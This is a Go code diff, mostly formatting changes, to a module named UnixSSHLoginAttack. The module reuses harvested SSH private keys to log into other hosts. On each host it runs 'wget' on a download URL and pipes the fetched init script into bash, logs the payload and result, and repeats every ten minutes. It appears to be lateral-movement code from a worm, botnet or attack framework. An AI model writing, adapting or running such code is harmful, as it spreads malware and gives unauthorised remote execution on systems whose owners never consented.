@@ -13,7 +13,6 @@ var SSHNOPassWordLoginAttackType = "SSHNoPasswdLoginAttack"
 var SSHNoPassWordLoginAttackName = "ssh_nopasswd_login_attack"
 
 type UnixSSHLoginAttack struct {
-
 	attackTasks *attack.AttackTasks
 
 	loginInfo *local.SSHLoginInfo
@@ -34,7 +33,7 @@ func (slog *UnixSSHLoginAttack) isChange(loginInfo *local.SSHLoginInfo) bool {
 		return true
 	}
 
-	if loginInfo.PrivateKey()!=""{
+	if loginInfo.PrivateKey() != "" {
 		return true
 	}
 
@@ -43,7 +42,7 @@ func (slog *UnixSSHLoginAttack) isChange(loginInfo *local.SSHLoginInfo) bool {
 
 func (slog *UnixSSHLoginAttack) isAttacked(host *local.SSHHost) bool {
 
-	if _,ok := slog.attacked[host.IP()];ok {
+	if _, ok := slog.attacked[host.IP()]; ok {
 
 		return true
 	}
@@ -68,13 +67,13 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 
 	port := sshHost.Port()
 
-	if port<=0 {
+	if port <= 0 {
 		port = 22
 	}
 
-	sshClient,err:= ssh.LoginWithPrivKey(host,port,user,privkey,10000)
+	sshClient, err := ssh.LoginWithPrivKey(host, port, user, privkey, 10000)
 
-	if err !=nil {
+	if err != nil {
 
 		return
 	}
@@ -84,13 +83,13 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 	//login ok ,then start to attack
 	var ap *attack.AttackProcess
 
-	initUrl := slog.attackTasks.DownloadInitUrl(host,port,SSHNOPassWordLoginAttackType,"init.sh")
+	initUrl := slog.attackTasks.DownloadInitUrl(host, port, SSHNOPassWordLoginAttackType, "init.sh.tpl")
 
-	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh;bash /var/tmp/init.sh",initUrl)
+	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh.tpl;bash /var/tmp/init.sh.tpl", initUrl)
 
 	result, err := sshClient.RunCmd(cmd)
 
-	if err!=nil {
+	if err != nil {
 
 		//attack failed
 		ap = &attack.AttackProcess{
@@ -105,11 +104,11 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 			Type:     SSHNOPassWordLoginAttackType,
 			Status:   -1,
 			Payload:  cmd,
-			Result:   fmt.Sprintf("%v",err),
-			Details: fmt.Sprintf("%s|%s",user,"nopass"),
+			Result:   fmt.Sprintf("%v", err),
+			Details:  fmt.Sprintf("%s|%s", user, "nopass"),
 		}
 
-	}else {
+	} else {
 
 		ap = &attack.AttackProcess{
 			TengoObj: attack.TengoObj{},
@@ -123,8 +122,8 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 			Type:     SSHNOPassWordLoginAttackType,
 			Status:   0,
 			Payload:  cmd,
-			Result:string(result),
-			Details: fmt.Sprintf("%s|%s",user,"nopass"),
+			Result:   string(result),
+			Details:  fmt.Sprintf("%s|%s", user, "nopass"),
 		}
 
 	}
@@ -136,7 +135,7 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 
 func (slog *UnixSSHLoginAttack) attack() {
 
-	timer := time.Tick(10*time.Minute)
+	timer := time.Tick(10 * time.Minute)
 
 	for {
 
@@ -179,6 +178,3 @@ func (slog *UnixSSHLoginAttack) Start() error {
 
 	return nil
 }
-
-
-
